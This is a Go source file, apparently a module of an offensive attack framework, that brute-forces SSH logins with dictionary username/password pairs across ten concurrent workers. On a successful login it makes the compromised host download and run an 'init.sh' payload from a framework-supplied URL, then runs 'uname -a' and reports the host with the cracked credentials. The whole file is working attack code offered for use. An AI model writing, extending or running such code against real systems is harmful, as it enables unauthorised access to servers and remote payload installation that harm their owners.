package bruteforce

import (
	"fmt"
	"github.com/cbot/attack"
	"github.com/cbot/proto/ssh"
	"github.com/cbot/targets/source"
	"strings"
	"sync"
)

var SSHBruteForceAttackType = "SSHBruteForceAttack"
var SSHBruteForceAttackDefaultProto = "ssh"
var SSHBruteForceAttackDefaultPort = 22
var SSHBruteForceAttackName = "ssh_bruteforce_attack"
var Timeout = 5000
var SSHBruteForceTasks = 10

type SSHBruteforceAttack struct {
	dictPool    *DictPool
	attackTasks *attack.AttackTasks
}

func NewSSHBruteforceAttack(dictPool *DictPool, attackTasks *attack.AttackTasks) *SSHBruteforceAttack {

	return &SSHBruteforceAttack{
		dictPool:    dictPool,
		attackTasks: attackTasks,
	}
}

func (sba *SSHBruteforceAttack) Name() string {

	return SSHBruteForceAttackName
}

func (sba *SSHBruteforceAttack) DefaultPort() int {

	return SSHBruteForceAttackDefaultPort
}

func (sba *SSHBruteforceAttack) DefaultProto() string {

	return SSHBruteForceAttackDefaultProto
}

func (sba *SSHBruteforceAttack) Accept(target source.Target) bool {

	types := target.Source().GetTypes()

	for _, t := range types {

		if strings.EqualFold(t, SSHBruteForceAttackType) {

			return true
		}
	}

	return false
}

func (sba *SSHBruteforceAttack) doAttack(sshClient *ssh.SSHClient, ip string, port int, user string, passwd string) {

	var ap *attack.AttackProcess

	initUrl := sba.attackTasks.DownloadInitUrl(ip, port, SSHBruteForceAttackType, "init.sh")

	cmd := sba.attackTasks.InitCmdForLinux(initUrl,SSHBruteForceAttackType)

	sshClient.RunCmd(cmd+" true")
	result,err:= sshClient.RunCmd("uname -a")

	if err != nil {

		//attack failed
		ap = &attack.AttackProcess{
			TengoObj: attack.TengoObj{},
			IP:       ip,
			Host:     ip,
			Port:     port,
			Proto:    "ssh",
			App:      "ssh",
			OS:       "linux",
			Name:     SSHBruteForceAttackName,
			Type:     SSHBruteForceAttackType,
			Status:   -1,
			Payload:  cmd,
			Result:   fmt.Sprintf("%v", err),
			Details:  fmt.Sprintf("%s|%s", user, passwd),
		}

	} else {

		ap = &attack.AttackProcess{
			TengoObj: attack.TengoObj{},
			IP:       ip,
			Host:     ip,
			Port:     port,
			Proto:    "ssh",
			App:      "ssh",
			OS:       "linux",
			Name:     SSHBruteForceAttackName,
			Type:     SSHBruteForceAttackType,
			Status:   0,
			Payload:  cmd,
			Result:   string(result),
			Details:  fmt.Sprintf("%s|%s", user, passwd),
		}

	}

	sba.PubProcess(ap)
}

func (sba *SSHBruteforceAttack) tryBruteforce(ip string, port int, entry *DictEntry) {

	sshClient, err := ssh.LoginWithPasswd(ip, port, entry.user, entry.pass, int64(Timeout))

	if err != nil {

		return
	}

	defer sshClient.Close()

	//start to attack
	sba.doAttack(sshClient, ip, port, entry.user, entry.pass)

}

func (sba *SSHBruteforceAttack) Run(target source.Target) error {

	defer sba.attackTasks.PubUnSyn()
	dictEntries := sba.dictPool.Dicts()

	ip := target.IP()
	port := target.Port()

	if port <= 0 {

		port = sba.DefaultPort()
	}

	if ip == "" || port <= 0 {
		return fmt.Errorf("Invalid ip:%s and port:%d", ip, port)
	}

	dictQueue := NewDictEntryQueue(dictEntries)

	var wg sync.WaitGroup
	wg.Add(SSHBruteForceTasks)

	for i := 0; i < SSHBruteForceTasks; i++ {

		go func() {

			for {
				entry := dictQueue.Pop()

				if entry == nil {
					break
				}

				sba.tryBruteforce(ip, port, entry)

			}

			wg.Done()
		}()
	}

	return nil
}

func (sba *SSHBruteforceAttack) PubProcess(process *attack.AttackProcess) {

	sba.attackTasks.PubAttackProcess(process)

}
